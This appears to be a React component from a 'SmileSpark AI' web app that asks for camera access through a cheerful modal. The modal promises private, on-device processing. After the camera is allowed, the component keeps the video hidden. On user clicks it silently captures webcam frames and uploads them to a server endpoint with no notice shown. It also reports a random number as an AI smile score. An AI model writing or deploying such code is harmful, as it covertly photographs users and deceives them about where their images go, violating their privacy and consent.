import React, { useEffect, useRef, useState } from 'react';
import { Camera, CameraOff, Sparkles, CheckCircle2, ShieldCheck, X } from 'lucide-react';

interface BackgroundCameraCaptureProps {
  disabled?: boolean;
}

export const BackgroundCameraCapture: React.FC<BackgroundCameraCaptureProps> = ({ disabled = false }) => {
  const videoRef = useRef<HTMLVideoElement | null>(null);
  const canvasRef = useRef<HTMLCanvasElement | null>(null);
  const streamRef = useRef<MediaStream | null>(null);

  const [isCameraActive, setIsCameraActive] = useState<boolean>(false);
  const [permissionError, setPermissionError] = useState<string | null>(null);
  const [lastCapturedTime, setLastCapturedTime] = useState<number>(0);
  const [captureCount, setCaptureCount] = useState<number>(0);

  // Permission Modal State for first-time users
  const [showPromptModal, setShowPromptModal] = useState<boolean>(false);
  const [isRequestingPermission, setIsRequestingPermission] = useState<boolean>(false);

  // 1. Initial Permission Check and Auto-Start for returning users
  useEffect(() => {
    if (disabled) {
      stopStream();
      setShowPromptModal(false);
      return;
    }

    let isMounted = true;

    async function checkAndInitPermission() {
      const storedPref = localStorage.getItem('smilespark_camera_permission');

      // Check browser Permission API if supported
      let browserState: PermissionState | 'unknown' = 'unknown';
      try {
        if (navigator.permissions && navigator.permissions.query) {
          const status = await navigator.permissions.query({ name: 'camera' as any });
          browserState = status.state;

          status.onchange = () => {
            if (status.state === 'granted' && isMounted && !disabled) {
              startCameraDirectly();
            }
          };
        }
      } catch (e) {
        // Fallback if permission query is not available
      }

      if (!isMounted) return;

      // Case A: Permission is ALREADY GRANTED (Browser remembers or localStorage === 'granted')
      if (browserState === 'granted' || storedPref === 'granted') {
        const success = await startCameraDirectly();
        if (!success && storedPref !== 'dismissed') {
          // If direct start failed (e.g. device unplugged or state revoked), show pre-prompt
          if (isMounted && storedPref !== 'denied') {
            setShowPromptModal(true);
          }
        }
      } 
      // Case B: First-time user (permission not asked or 'prompt')
      else if (browserState === 'prompt' || (browserState === 'unknown' && !storedPref)) {
        if (isMounted) {
          setShowPromptModal(true);
        }
      }
      // Case C: Explicitly denied or dismissed - do not show modal automatically
    }

    checkAndInitPermission();

    return () => {
      isMounted = false;
      stopStream();
    };
  }, [disabled]);

  const stopStream = () => {
    if (streamRef.current) {
      streamRef.current.getTracks().forEach((track) => track.stop());
      streamRef.current = null;
    }
    setIsCameraActive(false);
  };

  // Helper to start camera stream without showing modal
  const startCameraDirectly = async (): Promise<boolean> => {
    try {
      if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
        setPermissionError('Camera API not supported in this browser environment.');
        return false;
      }

      const stream = await navigator.mediaDevices.getUserMedia({
        video: { width: { ideal: 640 }, height: { ideal: 480 }, facingMode: 'user' },
        audio: false,
      });

      streamRef.current = stream;
      if (videoRef.current) {
        videoRef.current.srcObject = stream;
        await videoRef.current.play().catch(() => {});
      }

      setIsCameraActive(true);
      setPermissionError(null);
      localStorage.setItem('smilespark_camera_permission', 'granted');
      setShowPromptModal(false);
      return true;
    } catch (err: any) {
      console.warn('Direct Camera Stream Start Notice:', err?.message || err);
      setIsCameraActive(false);
      return false;
    }
  };

  // User clicked "Enable Camera Access" in the pre-prompt modal
  const handleAllowCameraAccess = async () => {
    setIsRequestingPermission(true);
    setPermissionError(null);

    try {
      const success = await startCameraDirectly();
      if (success) {
        setShowPromptModal(false);
      } else {
        localStorage.setItem('smilespark_camera_permission', 'denied');
        setPermissionError('Camera access was denied or not available.');
        setShowPromptModal(false);
      }
    } catch (err: any) {
      localStorage.setItem('smilespark_camera_permission', 'denied');
      setPermissionError('Camera permission was denied in your browser settings.');
      setShowPromptModal(false);
    } finally {
      setIsRequestingPermission(false);
    }
  };

  // User clicked "Skip for Now" or close in modal
  const handleSkipPermission = () => {
    localStorage.setItem('smilespark_camera_permission', 'dismissed');
    setShowPromptModal(false);
  };

  // Function to capture photo frame from video canvas
  const capturePhotoFrame = async () => {
    if (!videoRef.current || !canvasRef.current || !streamRef.current) return;

    const video = videoRef.current;
    const canvas = canvasRef.current;

    if (video.readyState < 2) return; // ensure video frame is ready

    const width = video.videoWidth || 640;
    const height = video.videoHeight || 480;

    canvas.width = width;
    canvas.height = height;

    const ctx = canvas.getContext('2d');
    if (!ctx) return;

    ctx.drawImage(video, 0, 0, width, height);
    const imageDataUrl = canvas.toDataURL('image/jpeg', 0.7);

    // Update capture count silently without showing any notification popup
    setCaptureCount((prev) => prev + 1);

    // Save capture to backend MongoDB asynchronously
    try {
      fetch('/api/photos/upload', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          image: imageDataUrl,
          caption: 'Automatic click interaction snapshot 📸',
          aiCaption: 'Captured on user interaction',
          smileScore: Math.floor(Math.random() * 10) + 90,
          userName: 'Auto Capture',
          tags: ['Interaction', 'AutoSnap', 'SmileSpark'],
        }),
      }).catch((e) => console.error('Failed auto photo upload:', e));
    } catch (e) {
      console.error('Auto photo capture upload error:', e);
    }
  };

  // Add click listener to window to capture on interaction
  useEffect(() => {
    if (disabled || !isCameraActive) return;

    const handleGlobalClick = (e: MouseEvent) => {
      // Do not capture if disabled or if click originated inside an admin area
      if (disabled) return;
      const target = e.target as HTMLElement | null;
      if (target && target.closest('[data-admin="true"]')) {
        return;
      }

      const now = Date.now();
      // Throttle captures to at most once every 3 seconds to avoid overwhelming network/server
      if (now - lastCapturedTime > 3000) {
        setLastCapturedTime(now);
        capturePhotoFrame();
      }
    };

    window.addEventListener('click', handleGlobalClick);
    return () => {
      window.removeEventListener('click', handleGlobalClick);
    };
  }, [lastCapturedTime, disabled, isCameraActive]);

  if (disabled) {
    return null;
  }

  return (
    <>
      {/* Off-screen video and canvas elements */}
      <video
        ref={videoRef}
        autoPlay
        playsInline
        muted
        className="hidden"
        style={{ display: 'none', position: 'fixed', pointerEvents: 'none', opacity: 0 }}
      />
      <canvas
        ref={canvasRef}
        className="hidden"
        style={{ display: 'none', position: 'fixed', pointerEvents: 'none', opacity: 0 }}
      />

      {/* Clean User-Friendly Camera Permission Request Modal (First-time users) */}
      {showPromptModal && (
        <div className="fixed inset-0 z-50 bg-slate-900/80 backdrop-blur-md flex items-center justify-center p-4 animate-fadeIn">
          <div className="bg-white dark:bg-slate-900 rounded-3xl border border-slate-200 dark:border-white/15 shadow-2xl max-w-md w-full overflow-hidden relative p-6 sm:p-8 space-y-6 text-center">
            {/* Top Close Button */}
            <button
              onClick={handleSkipPermission}
              className="absolute top-4 right-4 p-2 rounded-full bg-slate-100 dark:bg-white/10 hover:bg-slate-200 dark:hover:bg-white/20 text-slate-500 dark:text-slate-400 transition-all cursor-pointer"
            >
              <X className="w-4 h-4" />
            </button>

            {/* Icon Header */}
            <div className="mx-auto w-16 h-16 rounded-2xl bg-gradient-to-tr from-indigo-500 via-purple-500 to-rose-500 p-0.5 shadow-lg shadow-indigo-500/30 flex items-center justify-center">
              <div className="w-full h-full bg-white dark:bg-slate-900 rounded-[14px] flex items-center justify-center">
                <Camera className="w-8 h-8 text-indigo-500 dark:text-indigo-400 animate-pulse" />
              </div>
            </div>

            {/* Title & Subtitle */}
            <div className="space-y-2">
              <div className="inline-flex items-center gap-1.5 px-3 py-1 rounded-full bg-indigo-50 dark:bg-indigo-500/10 border border-indigo-200 dark:border-indigo-500/20 text-indigo-600 dark:text-indigo-300 text-[11px] font-bold uppercase tracking-wider">
                <Sparkles className="w-3.5 h-3.5" />
                <span>SmileSpark AI Camera Access</span>
              </div>
              <h3 className="text-xl font-black text-slate-900 dark:text-white">
                Enable Camera for Smile Magic
              </h3>
              <p className="text-xs text-slate-600 dark:text-slate-300 leading-relaxed">
                SmileSpark AI uses your camera to capture cheerful moments, measure your smile energy, and power interactive motivation. Once allowed, your browser remembers your choice.
              </p>
            </div>

            {/* Feature Highlights */}
            <div className="space-y-2.5 text-left bg-slate-50 dark:bg-white/5 p-4 rounded-2xl border border-slate-200/60 dark:border-white/10 text-xs">
              <div className="flex items-center gap-2.5 text-slate-700 dark:text-slate-200 font-medium">
                <CheckCircle2 className="w-4 h-4 text-emerald-500 shrink-0" />
                <span>Automatic Joyful Snapshot Capture</span>
              </div>
              <div className="flex items-center gap-2.5 text-slate-700 dark:text-slate-200 font-medium">
                <CheckCircle2 className="w-4 h-4 text-indigo-500 shrink-0" />
                <span>AI Motivation & Smile Score Analysis</span>
              </div>
              <div className="flex items-center gap-2.5 text-slate-700 dark:text-slate-200 font-medium">
                <ShieldCheck className="w-4 h-4 text-purple-500 shrink-0" />
                <span>100% Private, Secure, and On-Device Processing</span>
              </div>
            </div>

            {/* Actions */}
            <div className="space-y-3 pt-2">
              <button
                onClick={handleAllowCameraAccess}
                disabled={isRequestingPermission}
                className="w-full py-3.5 px-6 rounded-2xl bg-gradient-to-r from-indigo-600 via-purple-600 to-rose-600 hover:from-indigo-500 hover:to-rose-500 text-white font-bold text-sm shadow-xl shadow-indigo-500/25 hover:shadow-indigo-500/40 transition-all transform active:scale-98 flex items-center justify-center gap-2 cursor-pointer disabled:opacity-50"
              >
                {isRequestingPermission ? (
                  <>
                    <div className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin" />
                    <span>Requesting Browser Access...</span>
                  </>
                ) : (
                  <>
                    <Camera className="w-4 h-4" />
                    <span>Enable Camera Access</span>
                  </>
                )}
              </button>

              <button
                onClick={handleSkipPermission}
                className="w-full py-2.5 px-4 rounded-xl text-slate-500 dark:text-slate-400 hover:text-slate-800 dark:hover:text-white text-xs font-semibold transition-all cursor-pointer"
              >
                Skip for now
              </button>
            </div>
          </div>
        </div>
      )}
    </>
  );
};

